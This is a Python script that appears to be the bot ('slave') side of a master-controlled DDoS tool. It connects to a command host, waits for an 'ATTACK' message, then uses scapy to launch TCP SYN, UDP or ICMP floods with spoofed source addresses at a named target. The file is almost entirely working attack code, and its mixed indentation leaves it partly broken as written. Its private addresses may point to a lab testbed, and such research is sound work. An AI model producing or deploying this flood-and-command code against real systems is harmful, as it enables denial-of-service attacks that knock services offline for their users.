#!/usr/bin/python
from scapy.all import *
import time, os, sys, string, ntplib
from socket import *  #importing the socket library for network connections
from time import ctime,time
import random
import os


##Setting up variables
MS_LISTEN_HOST = '10.0.0.2'
MS_LISTEN_PORT = 8081

class Slave():
    def __init__(self, sock=None):
        print("DDoS mode loaded")
        self.num_connections = 0

        # get ntp times
	ntp_res=time()

        # connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('{0}'.format(ctime(ntp_res)))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)
          if (msg_buf.startswith('ATTACK')):
              command, host, myaddr, offtime , attack = msg_buf.split()
              self.doTheDos(host,myaddr,attack)

   
    def doTheDos(self, host, myaddr,attack):
        x = int(attack)
	if x == 1 :
		print ("|[DDoS TCP SYN FLOOD Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for source in range (1024,1124) :
			bytes = random.randrange(128, 1024)
			pkt_count = random.randrange(100,1000)
		    	IPlayer = IP(src=myaddr, dst=host)
			payload = "Z"*bytes
			TCPLayer= TCP(sport=source,dport=5201,flags="S")
		    	pkt = IPlayer / TCPLayer / payload
		    	send(pkt , count=pkt_count, inter=0.01)
		print("---------------ATTACK FINISHED---------------")

	if x == 2 :
		print ("|[DDoS UDP FLOOD Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for source in range (1024,1124) :
			bytes = random.randrange(128, 1024)
			pkt_count = random.randrange(100,1000)
			IPlayer = IP(src=myaddr, dst=host)
			payload ="Z"*bytes
			UDPLayer= UDP(sport=source,dport=5201)
			pkt = IPlayer / UDPLayer / payload
			send(pkt , count=pkt_count, inter=0.005)
				
		print("---------------ATTACK FINISHED---------------")
        
    	if x == 3 :
		print ("|[DDoS ICMP FLOOD Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for _ in range (100) :
			bytes = random.randrange(64, 128)
			pkt_count = random.randrange(100,1000)
	    		IPlayer = IP(src=myaddr, dst=host)
			payload ="Z"*bytes
	    		pkt = IPlayer / ICMP() / payload
	    		send(pkt , count=pkt_count, inter=0.01)
        
		print ("---------------ATTACK FINISHED---------------")
        

if __name__ == '__main__':
  slaveNode = Slave()
  msg = 0
  while(msg < 2):
#for i in xrange(conn):
    #slaveNode.dos()
    slaveNode.acceptMessages()
    msg = msg+1
